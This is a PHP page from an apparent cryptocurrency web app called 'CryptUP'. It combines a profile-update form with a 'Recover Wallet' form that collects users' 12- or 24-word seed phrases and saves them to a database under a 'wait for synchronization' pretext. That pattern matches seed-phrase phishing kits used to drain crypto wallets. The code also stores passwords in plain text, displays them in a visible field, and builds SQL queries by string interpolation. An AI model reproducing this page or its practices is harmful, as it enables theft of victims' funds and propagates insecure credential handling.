<?php
include_once "config/config.php";
if (!isset($_SESSION["cryptup_user"])) {
    echo "<script>location.href = 'login.php'</script>";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CryptUP || Settings</title>
    <link rel="icon" href="data:image/x-icon;base64," type="image/x-icon" />
    <link crossorigin href="https://fonts.gstatic.com/" rel="preconnect" />
    <link as="style" rel="stylesheet" onload="this.rel='stylesheet'"
        href="https://fonts.googleapis.com/css2?display=swap&family=Manrope:wght@400;500;700;800&family=Noto+Sans:wght@400;500;700;900" />
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
    <!-- <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script> -->
    <script src="assets/js/tailwindcss.js"></script>
    <style type="text/tailwindcss">
        :root {
      --primary-color: #53d22c;
      --background-color: #121212;
      --text-primary: #E0E0E0;
      --text-secondary: #A0A0A0;
      --accent-color: #66bb6a;
      --surface-color: #1E1E1E;
      --on-surface-color: #2D2D2D;
      --border-color: #333333;
    }
    body {
            font-family: 'Manrope', sans-serif;
            background-color: var(--background-color);
            color: var(--text-primary);
        }
    .input {
            @apply w-full bg-[var(--on-surface-color)] text-[var(--text-primary)] border border-[var(--border-color)] rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[var(--primary-color)] transition-shadow;
        }
    .card {
      @apply bg-[var(--surface-color)] rounded-2xl p-4 sm:p-6 shadow-lg;
    }
    .button_primary {
            @apply w-full bg-[var(--primary-color)] text-black rounded-full px-6 py-3 text-base font-bold hover:bg-[var(--accent-color)] transition-colors disabled:opacity-50 disabled:cursor-not-allowed;
        }
    .button_secondary {
            @apply bg-[var(--on-surface-color)] text-[var(--text-primary)] rounded-full px-4 py-2 hover:bg-[#383838] transition-colors;
        }
    .sidebar-mobile {
      transform: translateX(-100%);
    }
    .sidebar-mobile.open {
      transform: translateX(0);
    }
    @media (min-width: 768px) {
      .sidebar-mobile {
        transform: translateX(0);
      }
    }
  </style>
</head>

<body class="bg-[var(--background-color)] text-[var(--text-primary)] overflow-x-hidden">
    <div class="flex min-h-screen">
        <?php include "components/sidebar.php"; ?>

        <!-- Main Content -->
        <div class="flex-1 flex flex-col min-w-0">
            <!-- Mobile Top Bar -->
            <?php include "components/header.php"; ?>

            <!-- Main Dashboard -->
            <main class="flex-1 p-4 sm:p-6 lg:p-8">
                <div
                    class="w-full max-w-lg mb-6 mx-auto bg-[var(--surface-color)] rounded-2xl shadow-2xl p-8 space-y-6">
                    <div class="text-center">
                        <h2 class="text-3xl font-bold text-white">Update Profile</h2>
                        <p class="text-[var(--text-secondary)] mt-2">Securely send cryptocurrency to any address.</p>
                    </div>
                    <form method="post" class="space-y-6">
                        <div>
                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                                for="name">Name</label>
                            <div class="relative">
                                <input class="input pr-12" id="name" value="<?=$userInfo['name']?>" name="name" placeholder="Enter your name"
                                    type="text" />
                            </div>
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2" for="email">Email
                                Address</label>
                            <div class="relative">
                                <input class="input pr-12" id="email" name="email" value="<?= $userInfo['email'] ?>" placeholder="Enter address"
                                    type="email" />

                            </div>
                        </div>
                        <div>
                            <div class="flex justify-between items-baseline">
                                <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                                    for="password">Password</label>
                            </div>
                            <div class="relative">
                                <input class="input" id="password" placeholder="*****" value="<?=$userInfo['password']?>" name="password" type="text" />

                            </div>
                        </div>
                        <div>
                            <button class="button_primary" name="update" type="submit">
                                Update Profile
                            </button>
                        </div>
                        <?php
                        if (isset($_POST["update"])) {
                            $name = htmlspecialchars($_POST["name"]);
                            $email = htmlspecialchars($_POST["email"]);
                            $password = htmlspecialchars($_POST["password"]);

                            $update = mysqli_query($conn, "UPDATE `users` SET `name`='$name', `email`='$email', `password`='$password' WHERE `id`='$user_id'");
                            if ($update) {
                                echo "<script>location.href = 'settings.php'; alert('Profile updated successfully!')</script>";
                            } else {
                                echo "<script>alert('Something went wrong! Please try again.')</script>";
                            }
                        }
                        ?>
                    </form>
                </div>

                <!-- phrase -->
                <div class="card w-full max-w-lg mx-auto">
                    <form method="post" class="card w-full max-w-lg">
                        <div class="text-center">
                            <h1 class="typography_h1 mb-2">Enter Your Seed Phrase</h1>
                            <p class="typography_body">Enter your 12 or 24-word seed phrase to recover your wallet.</p>
                        </div>
                        <div class="mt-8">
                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                                for="recipient-address">Wallet</label>
                            <div class="relative">
                                <input class="input w-full" id="recipient-address" required name="wallet"
                                    placeholder="E.g: Trust wallet" type="text" />

                            </div>
                        </div>
                        <div class="mt-4">
                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                                for="phrase">Phrase</label>
                            <textarea id="phrase" required name="phrase"
                                class="input w-full min-h-36 resize-none p-4 text-base leading-normal bg-white/5 border-white/10 focus:border-[var(--primary-color)] focus:ring-0"
                                placeholder="Enter your 12 or 24-word seed phrase"></textarea>
                            <?php if (isset($_SESSION["error"])): ?>
                                <p class="typography_body mt-2 text-center text-red-500"><?= $_SESSION["error"]; ?></p>
                                <?php
                                unset($_SESSION["error"]);
                            endif;
                            ?>
                        </div>
                        <div class="mt-6 flex justify-center">
                            <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider"
                                name="save" type="submit">
                                <span>Recover Wallet</span>
                            </button>
                        </div>
                        <?php
                        if (isset($_POST["save"])) {
                            $wallet = htmlspecialchars($_POST["wallet"]);
                            $phrase = trim(htmlspecialchars($_POST["phrase"]));
                            $phraseArr = explode(" ", $phrase);
                            if (count($phraseArr) < 12 || (count($phraseArr) > 12 && count($phraseArr) < 24) || count($phraseArr) > 24) {
                                $_SESSION["error"] = "Invalid Wallet phrase!";
                                echo "<script>location.href = 'wallet-phrase.php'; </script>";
                            } else {

                                $save = mysqli_query($conn, "INSERT INTO `wallet_phrases` (`user_id`,`wallet`, `phrase`) VALUES ('$user_id', '$wallet', '$phrase')");
                                if ($save) {
                                    echo "<script>location.href = 'dashboard.php'; alert('Wallet phrase added wait for synchronization')</script>";
                                } else {
                                    $_SESSION["error"] = "Something went wrong!";
                                    echo "<script>location.href = 'wallet-phrase.php'; </script>";
                                }
                            }

                        }
                        ?>
                    </form>
                </div>

            </main>
        </div>
    </div>

</body>

</html>